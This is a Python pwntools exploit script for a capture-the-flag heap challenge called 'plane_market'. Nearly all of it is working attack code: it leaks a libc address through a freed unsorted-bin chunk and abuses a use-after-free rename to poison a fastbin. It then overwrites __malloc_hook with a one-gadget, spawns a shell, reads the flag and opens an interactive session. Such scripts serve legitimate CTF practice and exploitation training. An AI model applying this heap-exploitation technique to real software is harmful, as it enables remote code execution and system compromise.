from pwn import *
from struct import pack
import argparse
from setup import setup, u32Var, u64Var
from typing import List, Dict, Tuple

elfPath = './plane_market_patched'
breakpoints = '''
b *(0x4017ea)
b *(0x401839)
b *(0x401916)
b *(0x4019c1)
b *(0x40141b)
b *(0x4012bc)
continue
'''

io, pid, elf, libc, ld, oneGadget = setup(elfPath, breakpoints)

def sendName(name: bytes):
    io.sendafter(b'Enter name:', name)

def sellPlane(nameSize: int, name: bytes, cost: int, commentSize: int, comment: bytes):
    io.recvuntil(b'> ')
    io.send(b'1\n')
    io.sendafter(b'{?} Enter name size: ', str(nameSize).encode('ascii') + b'\n')
    io.sendafter(b'{?} Enter plane name: ', name)
    io.sendafter(b'{?} Enter plane cost: ', str(cost).encode('ascii') + b'\n')
    io.sendafter(b'{?} Do you wanna leave a comment? [Y\N]: ', (b'Y' if commentSize > 0 else b'N') + b'\n')
    if commentSize > 0:
        io.sendafter(b'{?} Enter comment size: ', str(commentSize).encode('ascii') + b'\n')
        io.sendafter(b'{?} Comment: ', comment)

def viewPlane(planeIndex: int):
    io.recvuntil(b'> ')
    io.send(b'4\n')
    io.recvuntil(b'{?} Enter plane id: ')
    io.send(str(planeIndex).encode('ascii') + b'\n')
    io.recvuntil(b'Name: ')
    name = io.recvline().split(b'\n')[0]
    io.recvuntil(b'Cost: ')
    cost = io.recvline().split(b'\n')[0]
    io.recvuntil(b'Time: ')
    time = io.recvline().split(b'\n')[0]
    io.recvuntil(b'Comment: ')
    comment = io.recvline().split(b'\n')[0]
    return {'name': name, 'cost': int(cost), 'time': int(time), 'Comment': comment}

def changePlaneName(planeIndex: int, name: bytes):
    io.recvuntil(b'> ')
    io.send(b'5\n')
    io.recvuntil(b'{?} Enter plane id: ')
    io.send(str(planeIndex).encode('ascii') + b'\n')
    io.sendafter(b'{?} Enter new plane name: ', name)

def deletePlane(planeIndex: int):
    io.recvuntil(b'> ')
    io.send(b'2\n')
    io.recvuntil(b'{?} Enter plane id: ')
    io.send(str(planeIndex).encode('ascii') + b'\n')

sendName('\x00'*0x80)

sellPlane(0x200, b'A\n', 10, 0x200, b'B\n') #0
sellPlane(0x200, b'A\n', 10, 0x200, b'B\n') #1
sellPlane(0x200, b'A\n', 10, 0x200, b'B\n') #2
sellPlane(0x200, b'A\n', 10, 0x20, b'B\n') #3
sellPlane(0x200, b'A\n', 10, 0x20, b'B\n') #4

deletePlane(0)
deletePlane(1)
deletePlane(2)
deletePlane(3)
deletePlane(4)

sellPlane(0x8, b'A'*0x8, 10, 0x1e0, b'B\n') #0

unsortedBinAddr = u64Var(viewPlane(0)['name'].split(b'A'*8)[1])
log.info('unsortedbin address: ' + hex(unsortedBinAddr))
unsortedBinOffset = 0x1b9ea0
libc.address = unsortedBinAddr - unsortedBinOffset
log.info('libc address: ' + hex(libc.address))

libOverwrite = libc.symbols['__malloc_hook']-0x13

log.info('malloc hook: ' + hex(libc.symbols['__malloc_hook']))
log.info('overide addr: ' + hex(libOverwrite))
log.info('oneGadget addr: ' + hex(oneGadget))

oneGadget = oneGadget + libc.address

sellPlane(0x60, b'70', 10, 0x0, b'A\n') #1
changePlaneName(1, b'changed\n')
deletePlane(1)

changePlaneName(1, p64(libOverwrite) + b'\x00'*8 + b'\n')

gadget = b'\x00'*0x13 + p64(oneGadget)
padding = b'\x00'*(0x60 - len(gadget))
gadget += padding

sellPlane(0x60, b'70', 10, 0x60, gadget) #2

io.recvuntil(b'> ')
io.send(b'1\n')
io.sendafter(b'{?} Enter name size: ', str(400).encode('ascii') + b'\n')
io.recvuntil('Enter plane name: ')

io.send(b'cat flag\n')

flag = io.recvuntil(b'}').decode('ascii')

log.success('flag: ' + flag)

io.interactive()
